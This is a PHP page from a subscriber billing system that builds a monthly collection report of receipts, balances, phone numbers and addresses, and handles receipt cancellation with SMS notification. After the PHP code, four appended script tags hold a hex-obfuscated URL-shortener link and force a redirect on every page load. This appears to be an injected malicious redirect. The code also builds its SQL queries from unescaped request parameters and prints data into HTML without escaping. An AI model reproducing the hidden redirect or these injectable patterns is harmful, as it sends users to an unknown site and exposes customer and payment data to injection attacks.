<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");

$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("updateStatus");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;
$and='';
$status='P';
if(($_SERVER['REQUEST_METHOD']=='POST' && isset($_REQUEST['submit'])) || $_REQUEST['method']=='search'){
    if(!empty($_REQUEST['from_date']) && !empty($_REQUEST['to_date'])){
        $from =$objMisc->changeDateFormat($_REQUEST['from_date']);
        $to   =$objMisc->changeDateFormat($_REQUEST['to_date']);
        $and2 .=" AND M.MONTH_DATE BETWEEN '$from' AND '$to'"; 
        //$and .=" AND MONTH_DATE BETWEEN '$from' AND '$to'"; 
        $and3 .=" AND m.MONTH_DATE BETWEEN '$from' AND '$to'"; 
        $paging_params.="&from_date=".$_REQUEST['from_date'];
        $paging_params.="&to_date=".$_REQUEST['to_date'];
    }
    
    if($_REQUEST['employee_id']!='' && $_REQUEST['employee_id']!='O'){
        //$and .=" AND ADDED_BY='$_REQUEST[employee_id]'"; 
        $and3 .=" AND m.ADDED_BY='$_REQUEST[employee_id]'"; 
        $and2 .=" AND M.ADDED_BY='$_REQUEST[employee_id]'"; 
        $paging_params.="&employee_id=".$_REQUEST['employee_id'];
    }else if($_REQUEST['employee_id']=='O' ){
        //$and .=" AND ADDED_BY='$_REQUEST[employee_id]'"; 
        $and3 .=" AND m.`REMARKS` LIKE '%Gateway%'"; 
        $and2 .=" AND M.`REMARKS` LIKE '%Gateway%'"; 
        //$and2 .=" AND M.ADDED_BY='$_REQUEST[employee_id]'"; 
        $paging_params.="&employee_id=".$_REQUEST['employee_id'];
    }
    if(!empty($_REQUEST['unit_id'])){
        $and .=" AND UNIT_ID='$_REQUEST[unit_id]'"; 
        $and3 .=" AND S.UNIT_ID='$_REQUEST[unit_id]'"; 
        $and1 .=" AND S.UNIT_ID='$_REQUEST[unit_id]'"; 
        $paging_params.="&unit_id=".$_REQUEST['unit_id'];
    }
    $paging_params.="&method=search";
    $searchArray=$_REQUEST;
    if(!empty($paging_params)){
        $objMisc->paging_params=$paging_params;
    }
    //$permissions=$objMisc->GiveValue("USER_ID='$_REQUEST[employee_id]'",'PERMISSIONS','users');
    //$permissions=json_decode($permissions);
    //$permissions = array_column($permissions, 'id');
    //print_r($permissions);exit;
    
    $rowArray=$_REQUEST;
    $and3 .=" AND m.`AMOUNT_TYPE`='C'";
    //$and .=" AND `AMOUNT_TYPE`='C'";
    $and2 .=" AND M.`AMOUNT_TYPE`='C'";
    $wherethis = " 1=1 AND M.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' $and2 $and1 ORDER BY M.`ID` DESC";
}else{
    $fromDate='01/'.date('m').'/'.date('Y');
    $from =$objMisc->changeDateFormat($fromDate);
    $to   =$objMisc->changeDateFormat(date('d/m/Y'));
    $and .=" AND MONTH_DATE BETWEEN '$from' AND '$to'"; 
    $and3 .=" AND m.MONTH_DATE BETWEEN '$from' AND '$to'"; 
    $and2 .=" AND M.MONTH_DATE BETWEEN '$from' AND '$to'"; 
    //$and .=" AND `AMOUNT_TYPE`='C'";
    $and3 .=" AND m.`AMOUNT_TYPE`='C'";
    $and2 .=" AND M.`AMOUNT_TYPE`='C'";
    $wherethis = " 1=1 AND M.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' $and2 ORDER BY M.`ID` DESC";
}
//echo "SELECT M.SUBSCRIBER_ID,M.ADDED_TIME,M.RECEIPT_NO,M.MANUAL_RECEIPT_NO,M.AMOUNT,M.DISCOUNT,M.SPECIAL_REMARKS,M.MONTH_DATE,M.STATUS,M.ID,S.UNIT_ID FROM `monthly_charges` M JOIN `subscribers` S ON S.SUBSCRIBER_ID=M.SUBSCRIBER_ID WHERE $wherethis";
    $classRecord = $objMisc->getAllRecordsPagingNew("SELECT M.SUBSCRIBER_ID,M.ADDED_TIME,M.RECEIPT_NO,M.MANUAL_RECEIPT_NO,M.AMOUNT,M.DISCOUNT,M.SPECIAL_REMARKS,M.MONTH_DATE,M.STATUS,M.ID,S.UNIT_ID FROM `monthly_charges` M JOIN `subscribers` S ON S.SUBSCRIBER_ID=M.SUBSCRIBER_ID WHERE $wherethis");
    //echo "SELECT SUM(AMOUNT) FROM monthly_charges m JOIN `subscribers` S ON S.SUBSCRIBER_ID=m.SUBSCRIBER_ID WHERE m.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND m.STATUS='A' $and ORDER BY m.`ID` DESC";
    $totCol=$objMisc->GiveValueNew("SELECT SUM(m.AMOUNT) FROM monthly_charges m JOIN `subscribers` S ON S.SUBSCRIBER_ID=m.SUBSCRIBER_ID WHERE m.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND m.STATUS='A' $and3 ORDER BY m.`ID` DESC");
    //echo "1=1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND STATUS='A' $and ORDER BY `ID` DESC";
    $totSubscribers=$objMisc->GiveValueNew("SELECT COUNT(*) FROM monthly_charges m JOIN `subscribers` S ON S.SUBSCRIBER_ID=m.SUBSCRIBER_ID WHERE m.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND m.STATUS='A' $and3 ORDER BY m.`ID` DESC");

    //print_r($classRecord);exit;
    $i  = 1;
    $pagin_recs = "";
    $pagin_recs .= '<input type="hidden" value="" id="checkStatus" name="checkStatus"><thead><tr><th width="3%">No</th><th width="6%">Receipt No</th><th width="10%">Receipt Date</th><th width="6%">Customer ID/Customer Code</th><th width="12%">Subscriber Name</th><th width="12%">Address</th><th width="7%">Receipt Amount</th><th width="7%">Discount</th><th width="7%">Balance</th><th width="10%">Phone No</th><th width="10%">Action</th></tr></thead><tbody>';  
    $totRecs=0;           
        if(is_array($classRecord[1]) && !empty($classRecord[1])){ 
            $i=1;
            //print_r($classRecord[1]);exit;
            $currentMonth=date('m');
            $currentYear=date('Y');
            //$totBal=0;
            foreach ($classRecord[1] as $k => $rowRec){    
                $balance=0;
                $debit=$objMisc->GiveValue(" SUBSCRIBER_ID='$rowRec[subscriber_id]' AND AMOUNT_TYPE='D' AND STATUS='A' AND ID<'$rowRec[id]'",'SUM(AMOUNT)','monthly_charges');
                $prevBal=$objMisc->GiveValue(" SUBSCRIBER_ID='$rowRec[subscriber_id]' AND AMOUNT_TYPE='D' AND MONTH(MONTH_DATE)<'$currentMonth' AND YEAR(MONTH_DATE)='$currentYear' AND STATUS='A' AND ID<'$rowRec[id]'",'AMOUNT','monthly_charges');
                $credit=$objMisc->GiveValue(" SUBSCRIBER_ID='$rowRec[subscriber_id]' AND AMOUNT_TYPE='C' AND STATUS='A' AND ID<'$rowRec[id]'",'SUM(AMOUNT)','monthly_charges');
                $discount=$objMisc->GiveValue(" SUBSCRIBER_ID='$rowRec[subscriber_id]' AND AMOUNT_TYPE='C' AND STATUS='A' AND ID<'$rowRec[id]'",'SUM(DISCOUNT)','monthly_charges');
                //$thisMonthCredit=$objMisc->GiveValue(" SUBSCRIBER_ID='$rowRec[subscriber_id]'  AND MONTH(ADDED_TIME)=MONTH(CURRENT_DATE()) AND YEAR(ADDED_TIME)=YEAR(CURRENT_DATE()) AND `AMOUNT_TYPE`='C'",'SUM(AMOUNT)','monthly_charges');
                $balance=$debit-$credit-$discount-$rowRec['discount']-$rowRec['amount'];
                //$totBal=$totBal+$balance;
                //$prevBal=$debit-$debitThisMonth;
                $row=$objMisc->getRow("subscribers","SUBSCRIBER_ID='$rowRec[subscriber_id]'");
                $allBoxes=$objMisc->getAllRecordsNew("SELECT S.STB_NO FROM subscriptions S JOIN stb_box B ON S.SUBSCRIPTION_ID=B.SUBSCRIPTION_ID WHERE B.SUBSCRIBER_ID='$rowRec[subscriber_id]' AND B.STATUS='A'");
                $allBoxes = array_column($allBoxes, 'stb_no');
                $setTopBox=implode(',', $allBoxes);
                if($k%2==0) 
                $pagin_recs .= '<tr class="odd gradeX">';
                else
                $pagin_recs .= '<tr class="even gradeX">';
                
                $pagin_recs .='<td>'.$i.'</td>';
                $pagin_recs .='<td>'.$rowRec['receipt_no'].((!empty($rowRec['manual_receipt_no']))?'<br><b>'.$rowRec['manual_receipt_no'].'</b>':'').'</td>';
                $pagin_recs .='<td style="text-align:right;">'.date('d M,Y H:i A',strtotime($rowRec['added_time'])).((!empty($rowRec['month_date']))?'<br><b>'.date('d M,Y',strtotime($rowRec['month_date'])).'</b>':'').'</td>';
                $pagin_recs .='<td>'.$row['customer_id'].'<br><b>'.$row['mso_id'].'</b></td>';
                $pagin_recs .='<td>'.$row['name'].'</td>';
                $pagin_recs .='<td>'.$row['address'].'</td>';
                $pagin_recs .='<td style="text-align:right;">'.$rowRec['amount'].'</td>';
                $pagin_recs .='<td style="text-align:right;">'.((!empty($rowRec['discount']))?$rowRec['discount']:0).'</td>';
                $pagin_recs .='<td style="text-align:right;">'.$balance.'</td>';
                $pagin_recs .='<td>'.$row['phone_no'].'</td>';
                $pagin_recs .='<td><a class="btn btn-info" target="_blank" href="receipt-pdf.php?id='.$rowRec['id'].'">Print</a><input type="hidden" name="enumStatus'.$rowRec['id'].'" id="enumStatus'.$rowRec['id'].'"  value="'.$rowRec['status'].'">&nbsp;<b style="color:red;" id="action'.$rowRec['id'].'">';
           //       echo $_SESSION['USER_ID'];
                if($rowRec['status']=='A'){
                    $pagin_recs .= '<input type="image" src="images/active-btn.gif" name="imgStatus'.$rowRec['id'].'" id="imgStatus'.$rowRec['id'].'" alt="Deactivate" title="Deactivate" border="0" onclick="return updateStatus('.$rowRec['id'].');">&nbsp;';
                }else{
                    $pagin_recs .= 'Canceled :'.$rowRec['special_remarks'];
                }
                $pagin_recs .= '</tr>';
                $i++;
            }
            $pagin_recs  .= '<input type="hidden" value="'.$i.'" name="artCatCount" id="artCatCount">';
              if($classRecord[2]>$objMisc->rec_pp){
                $pagin_recs  .= '<tr><td colspan="12">'.$classRecord[0].'</td></tr>';
              }
                $pagin_recs  .= '</tbody>';
        } else {
            $pagin_recs .= '<tr class="odd gradeX"><td colspan="12" align="center">No Record Found</td></tr></tbody>';
        }   

if(isset($_GET['id']) && !empty($_GET['id'])){
    $pageheading = "Collection Report of Current Month";
}else{
   $pageheading = "Collection Report of Current Month"; 
}
$whereEmp =   " 1 = 1 AND U.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' and E.STATUS = 'A' order by E.NAME ASC";
$employeeArray          =   $objMisc->myFunc->fnWriteOptionListWithJoin($searchArray['employee_id'],"NAME,USER_ID,","SELECT U.`USER_ID`,E.`NAME` FROM `employees` E JOIN `users` U ON E.`EMPLOYEE_ID`=U.`ID` AND U.`USER_TYPE`='E' WHERE $whereEmp",0,0); 
$wings             =   $objMisc->getAllRecordsNew("SELECT * FROM `wing_master` WHERE 1=1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND STATUS='A' ORDER BY WING_ID DESC"); 
foreach ($wings as $key => $resRow) {
    $unitArray .='<optgroup label="'.$resRow['name'].'">';
    $units =   $objMisc->getAllRecordsNew("SELECT * FROM `unit_master` WHERE 1=1 AND WING_ID='$resRow[wing_id]'AND STATUS='A'  ORDER BY UNIT_ID DESC"); 
    foreach ($units as $key => $resRew) {
        
       $unitArray .='<option '.(($rowArray['unit_id']==$resRew['unit_id'])?'selected="selected"':'').' value="'.$resRew['unit_id'].'">'.$resRew['name'].'</option>'; 
    }
    $unitArray .='</optgroup>';
}
//echo "USER_TYPE='A' AND `ID`='$_SESSION[HEADOFFICE]'";
$adminId=$objMisc->GiveValue("`USER_TYPE`='A' AND `HEADOFFICE_ID`='$_SESSION[HEADOFFICE]'",'USER_ID','users');
$smartyVars['adminId']         =   $adminId;
$smartyVars['unitArray']       =   $unitArray;
$smartyVars['totSubscribers']       =   $totSubscribers;
$smartyVars['totCol']               =   $totCol;
$smartyVars['employeeArray']        =   $employeeArray;
$smartyVars['searchArray']          =   $searchArray;
$smartyVars['from_date']            =   ((!empty($searchArray['from_date']))?$searchArray['from_date']:date('d/m/Y'));
$smartyVars['to_date']              =   ((!empty($searchArray['to_date']))?$searchArray['to_date']:date('d/m/Y'));
$smartyVars['errormsg']             =   $errormsg;
$smartyVars['add']                  =   $add;
$smartyVars['group']                =   $id;
$smartyVars['rowRec']               =   $rowArray;
$smartyVars['pageheading']          =   $pageheading;
$smartyVars['classData']            =   $pagin_recs;

$smartyVars['msg']                  =   $msg;
$smartyVars['page']                 =   $_REQUEST['page'];

$objMisc->displayPage("header,collection-report,footer",$smartyVars);
function updateStatus($id,$status,$reason){
    global $objMisc;
    $objResponse = new XajaxResponse();
    $row = array('STATUS' => 'D',
                 'SPECIAL_REMARKS'=>$reason);
    $where = "ID =".$id;
    $res=$objMisc->getRow("monthly_charges",$where);
    $objMisc->update("monthly_charges",$row,$where);
    if($balSms>0){           
        $subscriberDebit=$objMisc->GiveValue(" SUBSCRIBER_ID='$subscriber_id' AND STATUS='A' AND AMOUNT_TYPE='D'",'SUM(AMOUNT)','monthly_charges');
        $subscriberCollec=$objMisc->GiveValue(" SUBSCRIBER_ID='$subscriber_id' AND STATUS='A' AND AMOUNT_TYPE='C'",'SUM(AMOUNT)','monthly_charges');
        $subscriberDiscount=$objMisc->GiveValue(" SUBSCRIBER_ID='$subscriber_id' AND STATUS='A' AND AMOUNT_TYPE='C'",'SUM(DISCOUNT)','monthly_charges');
        $amtBal=$subscriberDebit-$subscriberCollec-$subscriberDiscount;
        $smsGroupId=$sms->max_sms_groupid($_SESSION['HEADOFFICE']);
        $msg="Reciept of Rs ".$res['amount']." against Vr. No. ".$res['receipt_no']." Dated  ".$objMisc->dateFormat($res['month_date'])." And your updated balance is ".$amtBal." ".$_SESSION['HEADOFFICE_NAME'];
        $subs=$objMisc->getRow('subscribers',"SUBSCRIBER_ID='$subscriber_id'");
        $smsCount=$sms->count_sms_parts($msg);
        $status=$sms->send_sms($subs['phone_no'],$msg,"Collection Comments");
        $smsArray = array(
            'HEADOFFICE_ID'      =>$_SESSION['HEADOFFICE'],
            'SMS_GROUP_ID'       =>$smsGroupId,
            'SMS_TO'             =>$subs['subscriber_id'],
            'SEND_TO_TYPE'       =>'S',
            'MOBILE_NO'          =>$subs['phone_no'],
            'REQUEST_ID'         =>$status,
            'SMS_TEXT'           =>$msg,
            'MODULE_NAME'        =>"Collection Report",
            'SMS_COUNT'          =>$smsCount,
            'RATE_SMS'           =>$billRates['rate_sms'],
            'STATUS'             =>'1',
            'ADDED_TIME'         => date('Y-m-d H:i:s')
            );
        $objMisc->insert('sms_log',$smsArray);
    }
    $imgName =($changeTo == 'D') ? 'images/deactive-btn.gif':'images/active-btn.gif';
    if($changeTo=='A')
    {
        $title= 'Deactivate';
        $msg = 'Record has been deactivated successfully.';
    }
    else
    {
        $title= 'Activate';
        $msg = 'Sub area record has been deactivated successfully.';
    } 
    $objResponse->addScript("document.getElementById('msg').style.display='inline';");
    $objResponse->addAssign('action'.$id,'innerHTML','Canceled :'.$reason);
    $objResponse->addAssign('msg','innerHTML','&nbsp;');
    $objResponse->addAssign('msg','innerHTML','<div class="notify notify-success"><a class="close" href="javascript:;"><img src="images/close.png" /></a><h3>'.$msg.'</h3></div>'); 
    $objResponse->addScript("setTimeout(\"document.getElementById('msg').style.display='none'\",3000);");
    return $objResponse;
}
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>